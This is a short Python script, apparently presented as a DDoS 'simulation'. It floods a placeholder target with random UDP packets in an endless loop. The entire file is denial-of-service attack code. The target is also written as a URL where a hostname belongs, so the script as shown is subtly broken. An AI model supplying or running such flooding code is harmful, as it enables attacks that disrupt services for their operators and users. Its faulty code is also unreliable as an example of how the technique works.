#!/usr/bin/env python3
import socket, os

# Tuple containing the target address and port
TARGET = ('http://target/', 80)

# Python script designed to simulate a DDoS attack.
if __name__ == '__main__':
    # Open the socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        # Send a random set of bytes to the target server
        sock.sendto(os.urandom(1490), TARGET)
